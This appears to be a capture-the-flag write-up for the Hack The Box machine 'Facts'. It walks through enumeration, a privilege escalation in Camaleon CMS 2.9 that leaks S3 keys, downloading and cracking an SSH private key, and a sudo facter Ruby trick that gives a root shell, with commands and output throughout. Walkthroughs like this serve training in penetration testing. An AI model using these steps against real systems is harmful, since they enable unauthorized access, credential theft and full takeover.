---
description: Facts is an easy-difficulty Linux machine
---

# Facts - HTB

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Enumeration

Starts scanning the network service using the nmap NSE, we found that ssh on port 22 and http on port 80, let’s check the web page first

```
$ nmap -sC -sV facts.htb  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-25 16:41 WIB  
Nmap scan report for facts.htb (10.129.244.96)  
Host is up (0.11s latency).  
Not shown: 998 closed tcp ports (conn-refused)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)  
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)  
80/tcp open  http    nginx 1.26.3 (Ubuntu)  
|_http-server-header: nginx/1.26.3 (Ubuntu)  
|_http-title: facts  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Open the web page it appears to be a blog sites titled ‘FACTS’

[![](https://camo.githubusercontent.com/dfe56040ab78fede10e5373e47e265b0dae8c705253ad06b5ee31b4196659c3b/68747470733a2f2f6d69726f2e6d656469756d2e636f6d2f76322f726573697a653a6669743a3737302f312a5479464f413345637a74333963476d5a59542d4339672e706e67)](https://camo.githubusercontent.com/dfe56040ab78fede10e5373e47e265b0dae8c705253ad06b5ee31b4196659c3b/68747470733a2f2f6d69726f2e6d656469756d2e636f6d2f76322f726573697a653a6669743a3737302f312a5479464f413345637a74333963476d5a59542d4339672e706e67)

Next, let’s discovering the directory of the websites since there’s nothing interesting finding in the web page, here I using gobuster with wordlists from the SecLists

```
gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt   
===============================================================  
Gobuster v3.6  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://facts.htb/  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.6  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/admin                (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
```

Here we found the /admin directory, let’s open it

[![](https://camo.githubusercontent.com/2f92960d38d20c088a07eb92ea50008158c894afddf265b6a650b917227c38ae/68747470733a2f2f6d69726f2e6d656469756d2e636f6d2f76322f726573697a653a6669743a3439322f312a35305533494172767a713449733055554d4f4c4d72512e706e67)](https://camo.githubusercontent.com/2f92960d38d20c088a07eb92ea50008158c894afddf265b6a650b917227c38ae/68747470733a2f2f6d69726f2e6d656469756d2e636f6d2f76322f726573697a653a6669743a3439322f312a35305533494172767a713449733055554d4f4c4d72512e706e67)

***

### Exploitation

Opening the /admin panel, we found that the web site using the Camaleon CMS v2.9 that vulnerable to Authenticated Privilege Escalation. I use the exploit from Alien0ne for this exploitation [https://github.com/Alien0ne/CVE-2025-2304](https://github.com/Alien0ne/CVE-2025-2304). for this exploitation we have to create the credential first using the create account feature from the web login page, after that we’ll provide the credential for the exploitation.

> This exploitation take the advantage of fetching a CSRF token from `/admin/profile/edit` and calls the `updated_ajax` endpoint to update `password[...]` fields and abuse `permit!` to set `password[role]=admin`.

```
$ sudo python3 exploit.py --url http://facts.htb --username user --password user123 -e -r  
[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)  
[+]Login confirmed  
   User ID: 5  
   Current User Role: client  
[+]Loading PPRIVILEGE ESCALATION  
   User ID: 5  
   Updated User Role: admin  
[+]Extracting S3 Credentials  
   s3 access key: REDACTED  
   s3 secret key: REDACTED  
   s3 endpoint: http://localhost:54321  
[+]Reverting User Role  
   User ID: 5  
   User Role: client
```

This exploitation impacting any authenticated user who can reach the vulnerable route can potentially escalate privileges by setting their role to `admin`. After escalation, admin-only pages (like site settings) may become accessible, potentially leaking sensitive configuration values (e.g., S3 keys).

We have the s3 key so now what?

We’ll use the s3 key to authenticate using the aws-cli and finding something valuable like ssh key, etc.

```
aws configure  
AWS Access Key ID [****************temp]: REDACTED  
AWS Secret Access Key [****************temp]: 4SdBDRt4ys9lzTWyFYJPibVYITfA0v8sfMHo6H1j  
Default region name [temp]:   
Default output format [temp]:
```

After we authenticate using our obtained aws credentials, we can observe the s3 bucket here, we find the ssh key to move to the machine

```
$ aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/  
2026-04-25 14:21:36         82 authorized_keys  
2026-04-25 14:21:36        464 id_ed25519  
$ aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./facts.id  
download: s3://internal/.ssh/id_ed25519 to ./facts.id          
$ aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_keys ./key  
download: s3://internal/.ssh/authorized_keys to ./key
```

Here we can crack the key using john for cracking the hashes that we’ll use as a password for authenticate using the ssh along with the ssh key

```
Using default input encoding: UTF-8  
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])  
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes  
Cost 2 (iteration count) is 24 for all loaded hashes  
Will run 16 OpenMP threads  
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status  
REDACTED      (id_ed25519)
```

Authenticate using the ssh and input the password

```
ssh trivia@facts.htb -i facts.id  
Enter passphrase for key 'facts.id':
```

Obtain the user flag in /home/williams

```
trivia@facts:/home/william$ cat user.txt   
REDACTED
```

***

### Privilege Escalation

Escalating the privilege into root using facter executable program that had the root privilege

```
trivia@facts:~$ echo 'exec "/bin/bash"' > exploit.rb  
trivia@facts:~$ sudo /usr/bin/facter --custom-dir=/home/trivia exploit  
root@facts:/home/trivia# whoami  
root
```

Obtain root flag in /root

```
root@facts:/home/trivia# cat /root/root.txt  
REDACTED  
root@facts:/home/trivia#
```
